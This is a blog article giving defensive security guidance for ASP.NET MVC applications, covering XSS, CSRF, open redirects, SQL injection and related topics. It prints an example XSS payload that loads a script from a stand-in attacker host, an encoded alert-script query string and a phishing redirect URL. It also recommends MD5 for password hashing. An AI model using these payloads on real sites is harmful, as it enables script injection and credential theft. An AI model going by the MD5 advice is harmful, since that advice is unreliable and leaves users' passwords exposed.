{"title": "Building Secure ASP.NET MVC Web Applications", "content": "<h2>Introduction</h2>\n<p>Building secure distributed Web applications is challenging.\u00a0There\u2019s nothing more exciting than creating a fancy web application. What isn\u2019t as exciting, however, is the security risk involved. When it comes to web application development in today\u2019s increasingly digitized, mobilized, Internet-of-Things world, security measures can no longer be the afterthoughts they once were.\u00a0With distributed applications, you have a lot of moving components and making those components work together in a secure fashion requires a working knowledge that spans products and technologies.</p>\n<p>In this article I will be focusing on the main security measures to be taken into consideration while building your ASP.NET MVC web application:</p>\n<ul>\n<li>Authentication</li>\n<li>Authorization</li>\n<li>Anti XSS (Cross Site Scripting)</li>\n<li>CSRF (Cross Site Request Forgery)</li>\n<li>Cookie Stealing</li>\n<li>Over Posting</li>\n<li>Preventing Open Redirection Attacks</li>\n<li>Blocking Brute Force Attacks</li>\n<li>File Upload Protection</li>\n<li>Prevent SQL Injection in ADO.NET and Entity Framework 6.0</li>\n<li>Using a Dedicated Error Logging API</li>\n<li>General Security\u00a0Recommendations</li>\n</ul>\n<h2>Authentication</h2>\n<p>Authentication is the process of obtaining identification credentials such as username and password from a user and validating those credentials against some authority. If the credentials are valid, the entity that submitted the credentials is considered an authenticated identity. Once a user has authenticated, a system can decide if the user is authorized to continue. Without knowing who a user is, authorization cannot take place.</p>\n<p>There are\u00a05 authentication modes in ASP.NET:\u00a0Windows/Forms/Passport/Federated/None</p>\n<ul>\n<li>Forms Authentication: Using this provider causes unauthenticated requests to be redirected to a specified HTML form using client side redirection. The user can then supply logon credentials, and post the form back to the server. If the application authenticates the request (using application-specific logic), ASP.NET issues a cookie that contains the credentials or a key for reacquiring the client identity. Subsequent requests are issued with the cookie in the request headers, which means that subsequent authentications are unnecessary.</li>\n<li>Passport Authentication: This is a centralized authentication service provided by Microsoft that offers a single logon facility and membership services for participating sites. ASP.NET, in conjunction with the Microsoft\u00ae Passport software development kit (SDK), provides similar functionality as Forms Authentication to Passport users.</li>\n<li>Windows Authentication: This provider utilizes the authentication capabilities of IIS. After IIS completes its authentication, ASP.NET uses the authenticated identity\u2019s token to authorize access.</li>\n<li>Federated:\u00a0Delegate authentication to an external identity provider. This can simplify development, minimize the requirement for user administration, and improve the user experience of the application.</li>\n<li>None:\u00a0Used when you are not authenticating users at all, or when you are developing custom authentication code (when you are not using the ASP.NET authentication provider).</li>\n</ul>\n<pre><code data-enlighter-language=\"null\">// web.config file\r\n&lt;authentication mode = \"[Windows/Forms/Passport/Federated/None]\"&gt;\r\n&lt;/authentication&gt;</code></pre>\n<p>Things to do in the authentication process:</p>\n<ul>\n<li>Make sure the user password is complex and hashed before storing it in the users table</li>\n<li>When you want to authenticate a user who is trying to login, make sure you hash the password he provided in the input field and compare the value with the hashed value stored in the Database. It is not recommended to use Ecrypt/Decrypt mechanism, the best practice is to hash the password (I recommend MD5 hashing algorithm)</li>\n<li>Modify the Session ID after logout and on login generate new Session ID by using \u201cSystem.Web.SessionState.SessionIDManager\u201d</li>\n<li>Implement two factors authentication</li>\n<li>Make sure that none of the admin and regular users have \u201cdb_owner\u201d access to your Database</li>\n</ul>\n<h2>Authorization</h2>\n<p>It is only a matter of time in developing most websites that you\u2019ll need to implement a way of restricting access to parts of the site.\u00a0Authorization determines whether an identity should be granted access to a specific resource. In ASP.NET, there are two ways to authorize access to a given resource:</p>\n<ul>\n<li>URL authorization:\u00a0URL authorization is performed to map users and roles to URLs in ASP.NET applications. This process can be used to selectively allow or deny access to arbitrary parts of an application (typically directories) for specific users or roles.</li>\n<li>File authorization: This is configured upon deployment of the website to protect the resources and prevent an attacker from browsing the directories</li>\n</ul>\n<p>If you are using the ASP.NET membership provider for authentication then it\u2019s quite easy to use Authorization in MVC. Here is an example:</p>\n<pre><code data-enlighter-language=\"null\">[Authorize(Users = \"admin,jsmith\")] \r\npublic ActionResult AddArticle() \r\n{ \r\n return View(); \r\n}</code></pre>\n<p>The Authorize attribute can be applied to the roles as well.</p>\n<h2>Anti XSS (Cross Site Scripting)</h2>\n<p>This is unfortunate because XSS is the number-one security vulnerability on the Web, and it\u2019s largely because of web developers unfamiliar with the risks.</p>\n<p>XSS can be carried out in one of two ways: by a user entering nasty script commands into a website that accepts unsanitized user input or by user input being directly displayed on a page. The first example is called passive injection\u2014whereby a user enters nastiness into a textbox, for example, and that script gets saved into a database and redisplayed later. The second is called active injection and involves a user entering nastiness into an input, which is immediately displayed onscreen.</p>\n<p><strong>Passive Injection</strong></p>\n<p>This type of attack occurs when the website accepts unsanitized input by the attacker and later displays it to the victim. Suppose we have an online messaging board or blog that allows users to post comments. If the input is accepted as is, the attacker can inject a script tag in the comment which might be something like this:</p>\n<pre><code data-enlighter-language=\"null\">This is a nice post&lt;/div&gt;&lt;script&gt;src=http://hackingsite.com/badscript.js&lt;/script&gt;\r\n</code></pre>\n<p><strong>Active Injection</strong></p>\n<p>For active injection, the user input is directly used on the webpage and is not saved on the server. Suppose we have a website that takes user\u2019s name as input from the query string and shows a welcome message.\u00a0As an attacker, I can pass this as the query string parameter: jsmith\\x3cscript\\x3e%20alert(\\x27weak security\\x27)%20\\x3c/script\\x3e. This will display an alert message \u201cweak security\u201d on the webpage.</p>\n<p>You should use the following prevention steps to avoid introducing XSS into your application:</p>\n<ul>\n<li>The ASP.NET Request Validation\u00a0should be Enabled all the time</li>\n<li>Ensure URL query string is encoded</li>\n<li>Ensure content sanitization is enabled to prevent adding scripts and untrusted attributes in the HTML content (you can use the AntiXSS library from nuget)</li>\n</ul>\n<h2>CSRF (Cross Site Request Forgery)</h2>\n<p>A cross-site request forgery (CSRF, pronounced C-surf, also known by the acronym XSRF) attack can be quite a bit more potent than simple XSS, discussed earlier. This section discusses CSRF, what it means to you, and how to prevent it.</p>\n<p>Cross-Site Request Forgery (CSRF) is an attack where a malicious site sends a request to a vulnerable site where the user is currently logged in.</p>\n<p>There are two ways to prevent CSRF attacks:</p>\n<ul>\n<li>Check that incoming requests have a Referer header referencing your domain (use Request.UrlReferrer or Request.ServerVariables). This will stop requests submitted from a third-party domain. However, some people disable their browser\u2019s Referer header for privacy reasons, and attackers can sometimes spoof that header. This is a weak solution</li>\n<li>Put a user-specific token as a hidden field in submit forms, and check that the right value was submitted.\u00a0The user requests an HTML page that contains a submit form, you\u00a0include two tokens in the response. One token is sent as a cookie,\u00a0the other is placed in a hidden form field. The tokens are generated randomly so that an adversary cannot guess the values. When the user submits the form, it must send both tokens back to the server (The browser automatically does this when the user submits the form.).\u00a0If a request does not include both tokens, the server disallows the request</li>\n</ul>\n<p>In MVC you can use the AntiForgeryToken to achieve this mission:</p>\n<pre><code data-enlighter-language=\"null\">@using (Html.BeginForm(\"Register\", \"Account\", FormMethod.Post, new { @class = \"form-horizontal\" }))\r\n{\r\n  @Html.AntiForgeryToken()\r\n}\r\n\r\nThis will output something like the following:\r\n&lt;form action=\"/Account/Register\" class=\"form-horizontal\" method=\"post\"&gt;\r\n &lt;input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"sK0JeZQqjaazgtWM5SYPXHhng0CoEWrpE_MWyiajpmDPKL2rjSoUpQAhEYoo1\" /&gt;\r\n &lt;!-- rest of form goes here --&gt;\r\n&lt;/form&gt;</code></pre>\n<h2>Cookie Stealing</h2>\n<p>Cookies are one of the things that make the Web usable, as most sites use cookies to identify users after login. Without them, life becomes login box after login box. If attackers can steal your cookie, they can often impersonate you. As a user, you can disable cookies on your browser to minimize the theft of your particular cookie (for a given site), but chances are you\u2019ll get a snarky warning that \u201cCookies must be enabled to access this site.\u201d</p>\n<p>To prevent cookie stealing you must apply the apply the following:</p>\n<ul>\n<li>Use SSL certificate, only allow HTTPS requests</li>\n<li>Apply Secure and HttpOnly flags\u00a0in the web.config. This will ensure that they are only sent over an SSL connection</li>\n</ul>\n<h2>Over Posting</h2>\n<p>ASP.NET MVC Model Binding is a powerful feature that greatly simplifies the process handling\u00a0user input by automatically mapping the input to your model properties based on naming conventions. However, this presents another attack vector, which can allow your attacker an opportunity to populate model properties you didn\u2019t even put on your input forms.</p>\n<p>How do we prevent this?\u00a0Well, a few ways. You can mark the property as [ReadOnly]. More commonly, you can use a BindAttribute on the method parameters and just include (whitelist) the properties you want to allow for binding:</p>\n<pre><code data-enlighter-language=\"null\">public async Task&lt;IActionResult&gt; Create([Bind(\"First,Last\")] Person person)\r\n</code></pre>\n<p>Where Person is the model class:</p>\n<pre><code data-enlighter-language=\"null\">public class Person\r\n{\r\n  public int ID { get; set; }\r\n  public string First { get; set; }\r\n  public string Last { get; set; }\r\n  public bool IsAdmin { get; set; }\r\n}</code></pre>\n<p>Or don\u2019t let models that look like this get anywhere near the user. This is the case for ViewModels. Make a model that looks like the View. Then do the work. You can make the work easier with something like AutoMapper.</p>\n<h2>Preventing Open Redirection Attacks</h2>\n<p><strong>What is an Open Redirection Attack?</strong></p>\n<p>Any web application that redirects to a URL that is specified via the request such as the QueryString or form data can potentially be tampered with to redirect users to an external, malicious URL. This tampering is called an open redirection attack.Whenever your application logic redirects to a specified URL, you must verify that the redirection URL hasn\u2019t been tampered with.</p>\n<p>If we try to visit an authorized page and we are not logged in, we are redirected to the login page. This redirection looks like this:</p>\n<pre><code data-enlighter-language=\"null\">/Account/Login?ReturnUrl=%2FHome%2FIndex.\r\n</code></pre>\n<p>Once we login we are redirected to the /Home/Index page, as mentioned by the ReturnUrl.</p>\n<p>Imagine, if you received an email which has a hyperlink like this:</p>\n<pre><code data-enlighter-language=\"null\">http://www.mydomain.com?ReturnUrl=www.fakedomain.com\r\n</code></pre>\n<p>So the user visits the page related to mydomain.com and enters the login name and password. Once the user enters the credentials, he is redirected to fakedomain.com which the attacker has made sure that the page looks similar to the login page of my mydomain.com. The victim might think that he is redirected to the login page again because he mistyped the credentials. So the user types in the username and password again (this time on malicious website) and clicks on Login. The attacker can save the username and password and redirect the victim to the legitimate website. The legitimate website had already authenticated the user on previous attempt, so the user sees the required page that he was trying to access.</p>\n<p>In this way, the attacker has stolen the user credentials without the victim ever knowing about it.</p>\n<p><strong>How To Prevent?</strong></p>\n<p>We can take advantage of the changes in ASP.NET MVC 4 &amp; 5, a new method was added to validate before redirecting the URL, the method is called \u201cRedirectToLocal\u201d. Whenever we redirect the user to any URL in the MVC application, we must check that Url is local or not. If not, we must raise an exception that open redirection attack was attempted.</p>\n<p>In MVC5, the AccountController Login method has:</p>\n<pre><code data-enlighter-language=\"null\">return RedirectToLocal(returnUrl);\r\n</code></pre>\n<div id=\"content\" class=\"group\">\n<div class=\"zone zone-content\">\n<article class=\"blog-post content-item\">This RedirectToLocal tests whether the URL is local or not using Url.IsLocalUrl() method. Similarly, if we are redirecting the user to any page based on the input coming from the user, we should test if the URL is local or not.</p>\n<h2>Blocking Brute Force Attacks</h2>\n<p>A brute-force attack is an attempt to discover a password by systematically trying every possible combination of letters, numbers, and symbols until you discover the one correct combination that works.<br />\nTo prevent this type of attacks, the following steps should be implemented:</p>\n<ul>\n<li>Lock user account after specific number of login attempts</li>\n<li>Enable Google reCAPTCHA on Login page</li>\n</ul>\n<h2>File Upload Protection</h2>\n<p>To prevent the attackers from uploading malicious files, you need to implement the following steps:</p>\n<ul>\n<li>The file to be uploaded\u00a0should be validated against a white-list extensions</li>\n<li>Restrict the maximum file size</li>\n<li>Disallow uploading executable files</li>\n</ul>\n<h2>Prevent SQL Injection in ADO.NET and EF 6.0 (Entity Framework 6.0)</h2>\n<p>SQL injection attack enables a malicious user to execute commands in the website\u2019s database by using the privileges granted to the website\u2019s login.</p>\n<p>To prevent the SQL injection attacks, the following prevention steps should be implemented:</p>\n<ul>\n<li>Input validation (constrain and sanitize input data). Check for bad input data by validating the type and format of the data</li>\n<li>Use SQL stored procedures for data access. The dynamic construction of SQL statements is being protected with the use of type-safe SQL parameters for data access</li>\n<li>Avoid using an over-privileged database login</li>\n<li>Avoid disclosing database error information, the actual error is logged in log file and the user is being redirected to a custom error page. Never display the actual error information</li>\n<li>Encrypt the SQL connection to protect sensitive data:\u00a0The Entity Framework does not directly handle data encryption. If users access data over a public network, your application should establish an encrypted connection to the data source to increase security</li>\n</ul>\n<h2>Using a Dedicated Error Logging\u00a0API</h2>\n<p>The best solution is to never turn off custom errors in any environment. Instead, I recommend that you make use of a dedicated error logging system like ELMAH, NLog ot log4net.</p>\n<h2>General Security\u00a0Recommendations</h2>\n<p>The following security steps\u00a0should be applied upon the deployment of the MVC web application:</p>\n<ul>\n<li>Enable the response header \u201cContent-Security-Policy\u201d</li>\n<li>Enable the response header \u201cX-Content-Type-Options\u201d</li>\n<li>Enable the response header \u201cX-XSS-Protection\u201d</li>\n<li>Block XFS attacks (Cross-Frame Scripting) by enabling the response header \u201cX-Frame-Options\u201d</li>\n<li>Prevent disclose the server information and the .NET framework information from the response header. The following headers should be removed from the response:\n<ul>\n<li>Server - Specifies web server version (IIS version)</li>\n<li>X-Powered-By - Indicates that the website is \u201cpowered by ASP.NET.\u201d</li>\n<li>X-AspNet-Version - Specifies the version of ASP.NET used.</li>\n</ul>\n</li>\n</ul>\n<h2>References</h2>\n<table width=\"918\">\n<tbody>\n<tr>\n<td>Resource</td>\n<td>URL</td>\n</tr>\n<tr>\n<td>Microsoft\u00a0Security Developer Center</td>\n<td><a href=\"http://msdn.microsoft.com/en-us/security/default.aspx\">http://msdn.microsoft.com/en-us/security/default.aspx</a></td>\n</tr>\n<tr>\n<td>Book: Beginnning ASP.NET Security (Barry Dorrans)</td>\n<td><a href=\"http://www.wrox.com/WileyCDA/WroxTitle/Beginning-ASP-NETSecurity.productCd-0470743654.html\">http://www.wrox.com/WileyCDA/WroxTitle/Beginning-ASP-NETSecurity.productCd-0470743654.html</a></td>\n</tr>\n<tr>\n<td>Free e-book: OWASP Top 10 for .NET Developers</td>\n<td><a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-1.html\">http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-1.html</a></td>\n</tr>\n<tr>\n<td>AntiXSS</td>\n<td><a href=\"http://antixss.codeplex.com/\">http://antixss.codeplex.com/</a></td>\n</tr>\n<tr>\n<td>Microsoft Information Security Team (makers of<br />\nAntiXSS and\u00a0CAT.NET)</td>\n<td><a href=\"http://blogs.msdn.com/securitytools\">http://blogs.msdn.com/securitytools</a></td>\n</tr>\n<tr>\n<td>Open Web Application Security Project (OWASP)</td>\n<td><a href=\"http://www.owasp.org/\">http://www.owasp.org/</a></td>\n</tr>\n</tbody>\n</table>\n</article>\n</div>\n</div>\n<div class=\"zone zone-after-content\">Source : <a href=\"https://weblogs.asp.net/jhallal/building-secure-asp-net-mvc-web-applications\">https://weblogs.asp.net/jhallal/building-secure-asp-net-mvc-web-applications</a></div>\n", "slug": "building-secure-asp-net-mvc-web-applications", "date": 1558706836, "cats": [0, 13, 14, 26, 15]}